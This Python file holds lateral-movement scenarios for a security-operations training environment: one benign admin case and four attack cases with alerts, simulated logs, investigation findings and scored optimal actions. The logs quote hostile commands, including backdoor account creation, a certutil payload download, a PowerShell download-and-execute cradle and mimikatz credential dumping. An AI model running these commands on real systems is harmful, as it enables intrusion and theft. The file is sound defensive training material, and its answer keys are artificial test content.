"""Lateral movement scenario templates for the SOC RL environment."""

LATERAL_SCENARIOS = [
    # BENIGN 1 -- IT admin using remote management tools
    {
        "id": "lateral-001",
        "category": "lateral_movement",
        "difficulty": "medium-hard",
        "is_true_threat": False,
        "severity": "medium",
        "mitre": {"tactic": "Lateral Movement", "technique": "T1021", "name": "Remote Services"},
        "alert": {
            "rule": "Multiple RDP Sessions From Single Source",
            "description": "Single source host initiated RDP connections to 14 servers within a 30-minute window.",
        },
        "source": {"ip": "10.10.1.20", "domain": "corp.acmeinc.local", "email": "", "geo": "INTERNAL"},
        "target": {
            "host": "Multiple (14 servers)", "ip": "10.10.2.0/24 range", "user": "susan.oconnor",
            "email": "susan.oconnor@acmeinc.com", "department": "IT Infrastructure",
            "role": "Senior Systems Administrator", "criticality": "high",
        },
        "indicators": {
            "rdp_sessions": 14, "time_window_minutes": 30, "source_host": "PAW-INFRA-03",
            "all_targets_managed": True, "mfa_verified": True,
            "change_ticket": "CHG-20260412-0019", "lateral_tool": "RDP (mstsc.exe)",
        },
        "raw_log": (
            "Apr 12 09:00:14 PAW-INFRA-03 mstsc[2210]: RDP connect to APP-WEB-01 (10.10.2.11) user=susan.oconnor\n"
            "Apr 12 09:03:42 PAW-INFRA-03 mstsc[2210]: RDP connect to APP-WEB-02 (10.10.2.12) user=susan.oconnor\n"
            "Apr 12 09:06:18 PAW-INFRA-03 mstsc[2210]: RDP connect to APP-API-01 (10.10.2.21) user=susan.oconnor\n"
            "Apr 12 09:08:55 PAW-INFRA-03 mstsc[2210]: RDP connect to DB-REPLICA-01 (10.10.2.31) user=susan.oconnor\n"
            "... (10 more RDP connections to 10.10.2.x servers)"
        ),
        "investigate": {
            "analyze_headers": "All RDP sessions originated from PAW-INFRA-03, a designated Privileged Access Workstation assigned to susan.oconnor. NLA (Network Level Authentication) with MFA smartcard verified on each connection.",
            "query_siem": (
                "2026-04-12T09:00:14Z  EventID=4624 LogonType=10 User=susan.oconnor Dst=APP-WEB-01 Src=PAW-INFRA-03\n"
                "2026-04-12T09:03:42Z  EventID=4624 LogonType=10 User=susan.oconnor Dst=APP-WEB-02 Src=PAW-INFRA-03\n"
                "[... 12 more RDP logon events to managed servers ...]\n"
                "2026-04-12T09:28:50Z  EventID=4634 LogonType=10 User=susan.oconnor -- all sessions closed cleanly\n"
                "Historical: susan.oconnor averages 10-20 RDP sessions on quarterly patch Tuesdays."
            ),
            "check_reputation": "susan.oconnor: Senior SysAdmin, 9 years tenure. PAW user. Tier 3 access approved. No prior incidents. Risk score: 8/100.",
            "check_asset": "PAW-INFRA-03 -- hardened admin workstation. CrowdStrike agent healthy. AppLocker policy enforced. Outbound traffic restricted to management VLAN 10.10.2.0/24 only.",
            "analyze_payload": "RDP sessions used to verify post-patch service health on 14 application and database servers. Each session lasted 1-3 minutes -- consistent with service-check workflow. No file transfers detected. No new processes launched.",
            "correlate_alerts": "Change ticket CHG-20260412-0019: 'Q2 Patch Tuesday -- verify service health post-reboot.' Approved by manager t.reynolds on 2026-04-11. WSUS confirms patches applied to all 14 servers at 08:00 UTC. Scheduled reboot completed at 08:45 UTC.",
        },
        "optimal_actions": [5, 2, 3, 10],
        "impact_if_missed": "No impact. Escalating would delay routine infrastructure maintenance and generate a false positive for a trusted admin.",
    },
    # THREAT 1 -- Pass-the-hash attack
    {
        "id": "lateral-002",
        "category": "lateral_movement",
        "difficulty": "medium-hard",
        "is_true_threat": True,
        "severity": "critical",
        "mitre": {"tactic": "Lateral Movement", "technique": "T1550", "name": "Use Alternate Authentication Material"},
        "alert": {
            "rule": "NTLM Authentication Anomaly -- Pass-the-Hash Suspected",
            "description": "NTLM type-3 authentication from non-standard source using a domain admin hash without interactive logon.",
        },
        "source": {"ip": "10.30.4.55", "domain": "corp.acmeinc.local", "email": "", "geo": "INTERNAL"},
        "target": {
            "host": "DC-PROD-01", "ip": "10.10.1.5", "user": "admin.svc_deploy",
            "email": "", "department": "IT Operations",
            "role": "Service Account -- Domain Admin", "criticality": "critical",
        },
        "indicators": {
            "auth_protocol": "NTLM (not Kerberos)", "logon_type": 3,
            "source_host": "WS-MKTG-0041", "source_user_normal": "hannah.brooks",
            "hash_reuse_detected": True, "mimikatz_ioc": True,
            "time_of_day": "03:22", "change_ticket_exists": False,
        },
        "raw_log": (
            "Apr 12 03:22:05 DC-PROD-01 ntlm_audit[901]: NTLM type-3 auth User=admin.svc_deploy Src=10.30.4.55 Workstation=WS-MKTG-0041 LogonType=3\n"
            "Apr 12 03:22:06 DC-PROD-01 audit[901]: EventID=4624 LogonType=3 User=admin.svc_deploy Src=10.30.4.55 AuthPkg=NTLM\n"
            "Apr 12 03:22:18 DC-PROD-01 audit[901]: EventID=4672 SpecialPrivileges User=admin.svc_deploy\n"
            "Apr 12 03:22:31 DC-PROD-01 audit[901]: EventID=4688 Process=cmd.exe Parent=services.exe User=admin.svc_deploy\n"
            "Apr 12 03:23:01 DC-PROD-01 audit[901]: EventID=4688 Process=net.exe Args='net user backdoor Pa$$w0rd! /add /domain'"
        ),
        "investigate": {
            "analyze_headers": "NTLM type-3 response from WS-MKTG-0041 (Marketing dept workstation) authenticating as admin.svc_deploy (Domain Admin). Kerberos was not used -- forced NTLM downgrade indicates hash replay. Source host is NOT a privileged access workstation.",
            "query_siem": (
                "2026-04-12T03:18:44Z  EventID=4624 LogonType=2 User=hannah.brooks Host=WS-MKTG-0041 (normal interactive)\n"
                "2026-04-12T03:20:11Z  EventID=4688 Process=mimikatz.exe Parent=powershell.exe User=hannah.brooks Host=WS-MKTG-0041\n"
                "2026-04-12T03:20:14Z  EventID=10 Sysmon TargetImage=lsass.exe SourceImage=mimikatz.exe GrantedAccess=0x1010\n"
                "2026-04-12T03:22:05Z  NTLM auth admin.svc_deploy from WS-MKTG-0041 -> DC-PROD-01\n"
                "2026-04-12T03:23:01Z  New domain user 'backdoor' created"
            ),
            "check_reputation": "hannah.brooks: Marketing Coordinator, 2 years tenure. No prior security alerts. Risk score: 15/100 (pre-incident). admin.svc_deploy: Domain Admin service account -- password last rotated 193 days ago.",
            "check_asset": "WS-MKTG-0041 -- standard workstation, NOT a PAW. Assigned to hannah.brooks. EDR shows mimikatz.exe execution at 03:20. Likely compromised via phishing (suspicious .hta file downloaded at 22:15 the prior evening).",
            "analyze_payload": "Mimikatz sekurlsa::logonpasswords executed, extracting NTLM hash for admin.svc_deploy (cached from prior admin logon). Hash used to authenticate to DC-PROD-01. Attacker then created backdoor domain account with full admin rights.",
            "correlate_alerts": "EDR alert: mimikatz.exe on WS-MKTG-0041 at 03:20 (not yet triaged). Email gateway: hannah.brooks received phishing email with .hta attachment on Apr 11 21:50 -- clicked at 22:15. No change ticket exists. admin.svc_deploy should never authenticate from Marketing VLAN.",
        },
        "optimal_actions": [1, 4, 5, 7, 8, 6],
        "impact_if_missed": "Attacker maintains persistent Domain Admin access via backdoor account, enabling full domain compromise, data exfiltration, ransomware deployment, or complete infrastructure takeover.",
    },
    # THREAT 2 -- RDP brute force from compromised host
    {
        "id": "lateral-003",
        "category": "lateral_movement",
        "difficulty": "medium-hard",
        "is_true_threat": True,
        "severity": "high",
        "compliance": {
            "framework": "GDPR",
            "data_type": "PII",
            "breach_notification_hours": 72,
            "data_volume": "bulk",
            "mandatory_escalation": False,
            "data_classification": "EU Personal Data",
        },
        "mitre": {"tactic": "Lateral Movement", "technique": "T1021", "name": "Remote Services"},
        "alert": {
            "rule": "RDP Brute Force -- Internal Source",
            "description": "437 failed RDP logon attempts from a single internal host targeting multiple servers in 12 minutes.",
        },
        "source": {"ip": "10.30.6.12", "domain": "corp.acmeinc.local", "email": "", "geo": "INTERNAL"},
        "target": {
            "host": "Multiple (23 servers)", "ip": "10.10.2.0/24, 10.10.3.0/24",
            "user": "Various accounts attempted", "email": "",
            "department": "Multiple", "role": "Various", "criticality": "high",
        },
        "indicators": {
            "failed_logons": 437, "unique_targets": 23, "unique_usernames_tried": 18,
            "time_window_minutes": 12, "source_host": "WS-ACCT-0019",
            "source_user": "david.kim", "successful_auths": 2, "tool_detected": "hydra",
        },
        "raw_log": (
            "Apr 12 04:11:03 APP-WEB-01 sshd[3221]: Failed password for administrator from 10.30.6.12 port 44120 rdp\n"
            "Apr 12 04:11:03 APP-WEB-01 audit[3221]: EventID=4625 LogonType=10 User=administrator Src=10.30.6.12 Reason=BadPwd\n"
            "Apr 12 04:11:04 APP-WEB-01 audit[3221]: EventID=4625 LogonType=10 User=admin Src=10.30.6.12 Reason=BadPwd\n"
            "[... 435 more failed attempts across 23 hosts ...]\n"
            "Apr 12 04:18:47 APP-API-01 audit[4401]: EventID=4624 LogonType=10 User=svc_backup Src=10.30.6.12 -- SUCCESS\n"
            "Apr 12 04:19:22 DB-STAGING-01 audit[5501]: EventID=4624 LogonType=10 User=svc_backup Src=10.30.6.12 -- SUCCESS"
        ),
        "investigate": {
            "analyze_headers": "RDP connection attempts from WS-ACCT-0019 (Accounting workstation) targeting 23 servers across application and database VLANs. User-agent string indicates Hydra brute force tool. Two successful authentications using svc_backup.",
            "query_siem": (
                "2026-04-12T04:11:03Z  437 EventID=4625 failures in 12 minutes from 10.30.6.12\n"
                "2026-04-12T04:18:47Z  EventID=4624 SUCCESS User=svc_backup Dst=APP-API-01 Src=10.30.6.12\n"
                "2026-04-12T04:19:22Z  EventID=4624 SUCCESS User=svc_backup Dst=DB-STAGING-01 Src=10.30.6.12\n"
                "2026-04-12T04:20:05Z  EventID=4688 Process=whoami.exe Host=APP-API-01 User=svc_backup\n"
                "2026-04-12T04:21:33Z  EventID=4688 Process=net.exe Args='net share' Host=APP-API-01 User=svc_backup\n"
                "Prior 90 days: david.kim 0 RDP connections. WS-ACCT-0019 0 outbound RDP connections."
            ),
            "check_reputation": "david.kim: Staff Accountant, 5 years tenure. No admin privileges. Risk score: 9/100 (pre-incident). svc_backup: service account with local admin on backup targets -- password age 312 days.",
            "check_asset": "WS-ACCT-0019 -- assigned to david.kim, Accounting. EDR flagged Cobalt Strike beacon loaded at 03:55 via macro in Q1_Audit_Report.xlsm. Hydra binary dropped at 04:08.",
            "analyze_payload": "Brute force attempted 18 usernames (administrator, admin, svc_backup, svc_deploy, sa, root, etc.) against 23 servers. svc_backup password cracked (weak password: Backup2024!). Post-auth: reconnaissance commands (whoami, net share, systeminfo) on APP-API-01 and DB-STAGING-01.",
            "correlate_alerts": "EDR alert: Cobalt Strike on WS-ACCT-0019 at 03:55 (not yet triaged). Email gateway: david.kim opened malicious xlsm attachment at 03:50. Firewall: no outbound C2 blocked yet -- beacon using DNS over HTTPS. svc_backup has no MFA requirement.",
        },
        "optimal_actions": [1, 3, 5, 7, 8, 6],
        "impact_if_missed": "Attacker pivots from compromised accounting workstation to application and database servers, gaining access to staging databases, customer records, and potential production environment via svc_backup credentials.",
    },
    # THREAT 3 -- Service account abuse for lateral movement
    {
        "id": "lateral-004",
        "category": "lateral_movement",
        "difficulty": "medium-hard",
        "is_true_threat": True,
        "severity": "high",
        "compliance": {
            "framework": "PCI-DSS",
            "data_type": "PCI",
            "breach_notification_hours": 72,
            "data_volume": "massive",
            "mandatory_escalation": True,
            "data_classification": "Cardholder Data",
        },
        "mitre": {"tactic": "Lateral Movement", "technique": "T1021", "name": "Remote Services"},
        "alert": {
            "rule": "Service Account Interactive Logon Anomaly",
            "description": "Service account svc_sqlagent used for interactive RDP logon -- service accounts are restricted to non-interactive authentication only.",
        },
        "source": {"ip": "10.10.2.31", "domain": "corp.acmeinc.local", "email": "", "geo": "INTERNAL"},
        "target": {
            "host": "DB-PROD-01", "ip": "10.10.3.10", "user": "svc_sqlagent",
            "email": "", "department": "Database Operations",
            "role": "Service Account -- SQL Agent", "criticality": "critical",
        },
        "indicators": {
            "logon_type": 10, "service_account_interactive": True, "source_host": "DB-REPLICA-01",
            "tools_executed": ["sqlcmd.exe", "bcp.exe", "7z.exe"], "data_staged": True,
            "staged_file_size_mb": 890, "time_of_day": "02:45", "change_ticket_exists": False,
        },
        "raw_log": (
            "Apr 12 02:45:11 DB-PROD-01 audit[7701]: EventID=4624 LogonType=10 User=svc_sqlagent Src=10.10.2.31 Workstation=DB-REPLICA-01\n"
            "Apr 12 02:45:33 DB-PROD-01 audit[7701]: EventID=4672 SpecialPrivileges User=svc_sqlagent\n"
            "Apr 12 02:46:02 DB-PROD-01 audit[7701]: EventID=4688 Process=sqlcmd.exe Args='-Q \"SELECT * FROM customers\"' User=svc_sqlagent\n"
            "Apr 12 02:50:19 DB-PROD-01 audit[7701]: EventID=4688 Process=bcp.exe Args='customers out C:\\Temp\\dump.csv' User=svc_sqlagent\n"
            "Apr 12 02:55:41 DB-PROD-01 audit[7701]: EventID=4688 Process=7z.exe Args='a C:\\Temp\\dump.7z C:\\Temp\\dump.csv -pEncrypted!' User=svc_sqlagent"
        ),
        "investigate": {
            "analyze_headers": "svc_sqlagent authenticated via RDP (LogonType=10) from DB-REPLICA-01. This is a policy violation: svc_sqlagent is configured for service logon (Type 5) only. Interactive logon should be denied by GPO -- GPO override detected.",
            "query_siem": (
                "2026-04-12T02:45:11Z  EventID=4624 LogonType=10 User=svc_sqlagent Src=DB-REPLICA-01 Dst=DB-PROD-01\n"
                "2026-04-12T02:46:02Z  sqlcmd.exe: full table dump of customers table\n"
                "2026-04-12T02:50:19Z  bcp.exe: bulk export 890MB to C:\\Temp\\dump.csv\n"
                "2026-04-12T02:55:41Z  7z.exe: password-protected archive created (dump.7z)\n"
                "2026-04-12T02:58:15Z  EventID=5145 Share=C$ File=Temp\\dump.7z Access=Read Src=10.30.4.55\n"
                "Prior history: svc_sqlagent 0 interactive logons ever."
            ),
            "check_reputation": "svc_sqlagent: service account for SQL Agent jobs. Should NEVER log on interactively. Password age: 455 days. Account is over-privileged with sysadmin role on all SQL instances.",
            "check_asset": "DB-PROD-01: production SQL Server, contains customer PII (450K records), payment data (PCI scope). Criticality: critical. DB-REPLICA-01: read replica, previously compromised (see lateral-002).",
            "analyze_payload": "Full dump of customers table (450K records including names, emails, addresses, phone numbers). Exported via BCP to CSV, compressed with 7-Zip using password 'Encrypted!'. Archive then accessed from 10.30.4.55 via admin share (C$) -- this is the same IP as the Pass-the-Hash source.",
            "correlate_alerts": "10.30.4.55 (WS-MKTG-0041) is the compromised host from the pass-the-hash attack (lateral-002). Attack chain: phishing -> Cobalt Strike -> mimikatz -> PtH to DB-REPLICA-01 -> pivot to DB-PROD-01 via svc_sqlagent -> data staging. No change ticket. svc_sqlagent GPO for 'Deny interactive logon' was removed 3 days ago (change not authorized).",
        },
        "optimal_actions": [1, 4, 5, 7, 8],
        "impact_if_missed": "450K customer PII records staged for exfiltration. If data leaves the network, triggers mandatory breach notification under GDPR/CCPA, potential multi-million dollar fines, and severe reputational damage.",
    },
    # THREAT 4 -- WMI lateral movement
    {
        "id": "lateral-005",
        "category": "lateral_movement",
        "difficulty": "medium-hard",
        "is_true_threat": True,
        "severity": "high",
        "mitre": {"tactic": "Execution", "technique": "T1047", "name": "Windows Management Instrumentation"},
        "alert": {
            "rule": "WMI Remote Process Execution Detected",
            "description": "WMI used to remotely spawn processes on 6 hosts from a single non-admin workstation within 8 minutes.",
        },
        "source": {"ip": "10.30.7.33", "domain": "corp.acmeinc.local", "email": "", "geo": "INTERNAL"},
        "target": {
            "host": "Multiple (6 servers)", "ip": "10.10.2.0/24", "user": "admin.jthomas",
            "email": "j.thomas@acmeinc.com", "department": "IT Operations",
            "role": "Domain Admin (compromised)", "criticality": "critical",
        },
        "indicators": {
            "wmi_calls": 6, "time_window_minutes": 8, "source_host": "WS-HR-0012",
            "source_user_normal": "patricia.lane", "credential_used": "admin.jthomas",
            "processes_spawned": ["powershell.exe", "certutil.exe"],
            "payload_downloaded": True, "c2_callback": True,
        },
        "raw_log": (
            "Apr 12 05:02:11 APP-WEB-01 WMI[6601]: Remote process create User=admin.jthomas Src=10.30.7.33 Cmd='powershell -enc aQBlAHgA...'\n"
            "Apr 12 05:03:44 APP-WEB-02 WMI[6602]: Remote process create User=admin.jthomas Src=10.30.7.33 Cmd='powershell -enc aQBlAHgA...'\n"
            "Apr 12 05:05:19 APP-API-01 WMI[6603]: Remote process create User=admin.jthomas Src=10.30.7.33 Cmd='certutil -urlcache -split -f http://10.30.7.33:8080/s.exe'\n"
            "Apr 12 05:06:02 APP-API-02 WMI[6604]: Remote process create User=admin.jthomas Src=10.30.7.33 Cmd='powershell -enc aQBlAHgA...'\n"
            "Apr 12 05:08:30 SRV-FILE-01 WMI[6605]: Remote process create User=admin.jthomas Src=10.30.7.33 Cmd='powershell -enc aQBlAHgA...'\n"
            "Apr 12 05:09:47 SRV-PRINT-01 WMI[6606]: Remote process create User=admin.jthomas Src=10.30.7.33 Cmd='powershell -enc aQBlAHgA...'"
        ),
        "investigate": {
            "analyze_headers": "WMI process creation events from WS-HR-0012 (HR department workstation, assigned to patricia.lane) using admin.jthomas credentials. WS-HR-0012 is NOT a PAW -- admin credentials should never be used from this host. Encoded PowerShell payloads decode to IEX (Invoke-Expression) downloading Cobalt Strike stagers.",
            "query_siem": (
                "2026-04-12T04:55:00Z  EventID=4624 LogonType=3 User=admin.jthomas Src=10.30.7.33 Dst=APP-WEB-01 AuthPkg=NTLM\n"
                "2026-04-12T05:02:11Z  Sysmon EventID=1 WmiPrvSE.exe spawned powershell.exe on APP-WEB-01\n"
                "2026-04-12T05:05:19Z  Sysmon EventID=1 WmiPrvSE.exe spawned certutil.exe on APP-API-01 (downloading s.exe)\n"
                "2026-04-12T05:10:02Z  Sysmon EventID=3 APP-WEB-01 powershell.exe -> 185.220.101.44:443 (known C2 IP)\n"
                "Historical: admin.jthomas never authenticated from 10.30.7.x VLAN. WS-HR-0012 never initiated WMI calls."
            ),
            "check_reputation": "patricia.lane: HR Generalist, 3 years tenure. No admin access. Risk score: 11/100 (pre-incident). admin.jthomas: Domain Admin account for j.thomas -- legitimate admin who is currently on vacation (April 8-15).",
            "check_asset": "WS-HR-0012: standard workstation. EDR detected suspicious macro execution from Benefits_Update.docm at 04:48. LaZagne credential harvester executed at 04:52. admin.jthomas credentials were cached on this machine from a remote support session 2 weeks ago.",
            "analyze_payload": "Base64 PowerShell decodes to: IEX(New-Object Net.WebClient).DownloadString('http://10.30.7.33:8080/stager.ps1'). Certutil downloading s.exe (SHA256: a1b2c3...) matches Cobalt Strike beacon. Objective: establish persistent footholds on 6 internal servers for later data exfiltration or ransomware staging.",
            "correlate_alerts": "Attack chain: phishing -> macro -> LaZagne credential dump -> admin.jthomas hash harvested -> WMI lateral movement to 6 servers. j.thomas (real admin) is on PTO -- did not initiate activity. C2 callbacks to 185.220.101.44 (Tor exit node). Threat intel: IP linked to APT group activity.",
        },
        "optimal_actions": [1, 3, 5, 7, 8, 6],
        "impact_if_missed": "Attacker establishes persistent Cobalt Strike beacons on 6 production servers using a Domain Admin account, enabling full network compromise, ransomware staging, or long-term espionage operations.",
    },
]
